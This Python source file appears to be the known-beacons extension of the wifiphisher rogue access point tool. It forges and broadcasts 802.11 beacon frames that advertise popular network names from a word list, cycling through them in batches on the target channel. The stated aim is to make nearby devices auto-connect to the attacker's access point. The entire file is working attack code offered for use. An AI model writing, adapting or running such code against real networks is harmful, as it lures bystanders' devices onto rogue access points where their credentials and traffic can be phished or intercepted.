"""
Extension that sends a number of known beacons to trigger the AUTO-CONNECT flag.
"""

import logging
import time
from collections import defaultdict

import scapy.layers.dot11 as dot11
import wifiphisher.common.constants as constants
import wifiphisher.common.globals as universal

logger = logging.getLogger(__name__)

class Knownbeacons(object):
    """
    Sends a number of known beacons to trigger the Auto-Connect flag.
    """

    def __init__(self, shared_data):
        """
        Setup the class with all the given arguments

        :param self: A Beacons object
        :param data: Shared data from main engine
        :type self: Beacons
        :type data: dict
        :return: None
        :rtype: None
        """

        self.data = shared_data
        # store channel to frame list
        self._packets_to_send = defaultdict(list)
        self._starttime = time.time()
        self._msg = []
        self._full_pkt_list = self._get_known_beacons()


    def _get_known_beacons(self):
        """
        Retrieve the popular ESSIDs from the text file
        and then construct all the known beacon frames.

        :param self: A Beacons object
        :type self: Beacons
        :return: A list with all the beacon frames
        :rtype: list
        """

        beacons = list()
        essid = str()
        bssid = self.data.rogue_ap_mac

        # locate the known WLANS file
        area_file = constants.KNOWN_WLANS_FILE

        with open(area_file) as _file:
            for line in _file:
                if line.startswith("!"):
                    continue
                essid = line.rstrip() 

                # craft the required packet parts
                frame_part_0 = dot11.RadioTap()
                frame_part_1 = dot11.Dot11(
                    subtype=8,
                    addr1=constants.WIFI_BROADCAST,
                    addr2=bssid,
                    addr3=bssid)
                frame_part_2 = dot11.Dot11Beacon(cap=constants.KB_BEACON_CAP)
                frame_part_3 = dot11.Dot11Elt(ID="SSID", info=essid)
                frame_part_4 = dot11.Dot11Elt(
                    ID="Rates", info=constants.AP_RATES)
                frame_part_5 = dot11.Dot11Elt(ID="DSset", info=chr(7))

                # create a complete packet by combining the parts
                complete_frame = (
                    frame_part_0 / frame_part_1 / frame_part_2 /
                    frame_part_3 / frame_part_4 / frame_part_5)
                # add the frame to the list
                beacons.append(complete_frame)
        return beacons

    def get_packet(self, pkt):
        """
        We start broadcasting the beacons on the first received packet

        :param self: A Knownbeacons object
        :param packet: A scapy.layers.RadioTap object
        :type self: Knownbeacons
        :type packet: scapy.layers.RadioTap
        :return: A tuple containing ["*"] followed by a list of
            the crafted beacon frames
        :rtype: tuple(list, list)
        .. warning: pkt is not used here but should not be removed since
            this prototype is requirement
        """

        # If INTERVAL seconds have passed...
        if (time.time() - self._starttime > constants.KB_INTERVAL):
            # Do a list shift
            self._full_pkt_list = self._full_pkt_list[constants.KB_BUCKET_SIZE:] + \
                                    self._full_pkt_list[:constants.KB_BUCKET_SIZE]
            self._starttime = time.time()
            first_essid = self._full_pkt_list[0][dot11.Dot11Elt].info.decode("utf8")
            last_essid = self._full_pkt_list[constants.KB_BUCKET_SIZE-1][dot11.Dot11Elt].info.decode("utf8")

            self._msg.append("Sending %s known beacons (%s ... %s)" % \
                            (str(constants.KB_BUCKET_SIZE), first_essid, \
                            last_essid))

        self._packets_to_send["*"] = self._full_pkt_list[:constants.KB_BUCKET_SIZE]
        return self._packets_to_send

    def send_output(self):
        """
        Sending Knownbeacons notification

        :param self: A Knownbeacons object
        :type self: Knownbeacons
        :return: list of notification messages
        :rtype: list
        .. note: Only sends notification for the first time to reduce
            clutters
        """

        if self._msg:
            return self._msg
        return ["Sending known beacons..."]

    def send_channels(self):
        """
        Send all interested channels

        :param self: A Knownbeacons object
        :type self: Knownbeacons
        :return: A list with all the channels interested
        :rtype: list
        .. note: Only the channel of the target AP is sent here
        """

        return [self.data.target_ap_channel]

    def on_exit(self):
        """
        :param self: A Knownbeacons object
        :type self: Knownbeacons
        Free all the resources regarding to this module
        :return: None
        :rtype: None
        """

        pass
